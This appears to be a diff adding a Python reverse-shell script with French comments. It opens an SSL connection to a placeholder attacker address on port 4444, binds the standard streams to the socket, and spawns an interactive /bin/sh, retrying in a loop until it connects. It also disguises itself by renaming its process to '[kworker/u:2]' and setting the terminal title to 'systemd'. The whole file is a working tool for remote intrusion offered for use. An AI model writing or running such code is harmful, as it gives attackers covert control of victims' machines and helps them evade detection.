@@ -1,0 +1,38 @@
+import socket
+import subprocess
+import os
+import ssl
+import base64
+import time
+import sys
+
+ATTACKER_IP = "ip"
+ATTACKER_PORT = 4444
+RETRY_DELAY = 5  # Temps d'attente avant de rÃ©essayer
+
+def connect():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock = ssl.wrap_socket(sock)  # SÃ©curise la connexion avec SSL
+            sock.connect((ATTACKER_IP, ATTACKER_PORT))
+
+            os.dup2(sock.fileno(), 0)
+            os.dup2(sock.fileno(), 1)
+            os.dup2(sock.fileno(), 2)
+
+            # Changer le nom du processus pour masquer son exÃ©cution
+            try:
+                os.system("echo -ne '\\033]0;systemd\\007'")  # Change le titre du terminal
+                sys.argv[0] = "[kworker/u:2]"  # Modifie le nom affichÃ© dans les processus
+            except Exception:
+                pass
+
+            shell = subprocess.call(["/bin/sh", "-i"])
+            sock.close()
+            break
+        except Exception as e:
+            time.sleep(RETRY_DELAY)
+
+if __name__ == "__main__":
+    connect()
